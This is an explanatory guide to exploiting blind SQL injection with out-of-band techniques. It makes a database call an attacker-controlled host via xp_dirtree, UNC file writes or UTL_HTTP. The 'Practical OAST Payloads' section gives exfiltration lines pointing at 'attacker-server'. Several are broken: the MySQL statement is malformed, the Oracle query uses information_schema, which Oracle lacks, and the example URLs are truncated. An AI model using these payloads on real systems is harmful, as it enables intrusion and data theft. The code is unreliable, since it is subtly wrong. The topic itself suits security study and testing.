# 📡 Exploiting Blind SQL Injection Using Out-of-Band (OAST) Techniques

Out-of-band (OAST) techniques are the "last resort" for blind SQL injection. They are used when the application is completely "silent", meaning it doesn't show data, doesn't throw errors, and doesn't pause even if you use a time-delay command.

## The Problem: The Silent Thread

In this scenario, the application takes your input (like a tracking cookie) and hands it off to a background process. Because the main thread finishes and sends you a Success message immediately, you can't see any changes in the response. It's like throwing a message into a black hole.

## The Solution: Phone Home

Since the application won't talk to you, you force the **database itself** to talk to an external server that you control. You inject a command that tells the database to make a network request (usually a DNS lookup) to your domain.

- **Standard Blind SQL:** You ask the DB a question and try to sense the answer via its behavior.
- **OAST SQL:** You tell the DB, "If the admin password starts with 'A', visit `://my-malicious-site.com`." 

## How It Works in Practice

The payload usually involves a built-in database function that interacts with the file system or network.

- **On Oracle:** You might use `UTL_HTTP` or `UTL_INADDR`
- **On Microsoft SQL Server:** You might use `xp_dirtree` to point to a network share

## The Workflow

1. **Inject:** You send a payload like `SELECT ... FROM users WHERE ... (trigger DNS lookup to ://oastify.com)`
2. **Wait:** The app responds OK immediately
3. **Check:** You look at your OAST listener. If a "ping" arrives from the database's IP address, you have confirmed the injection and potentially exfiltrated data.

## OAST Listener Services

- **Burp Collaborator** - Built into Burp Suite
- **Oastify** - Simple OAST server
- **Pingback** - DNS-based interaction tracking
- **Custom DNS server** - Set up your own

## Practical OAST Payloads

### MySQL/MariaDB
```sql
SELECT INTO OUTFILE '\\\\attacker-server\\share\\file'
```

### SQL Server
```sql
exec xp_dirtree '\\attacker-server\share\'
```

### Oracle
```sql
SELECT UTL_HTTP.request('http://attacker-server/callback?data=' || table_name) FROM information_schema.tables;
```

## Advantages of OAST

- Works even when responses are completely uniform
- Can exfiltrate large amounts of data
- Hard to detect without network monitoring
- Time-independent (no network jitter issues)

## Disadvantages of OAST

- Requires database permissions for network functions
- May be blocked by firewall rules
- Requires attacker-controlled infrastructure
- More complex to set up than time-based techniques
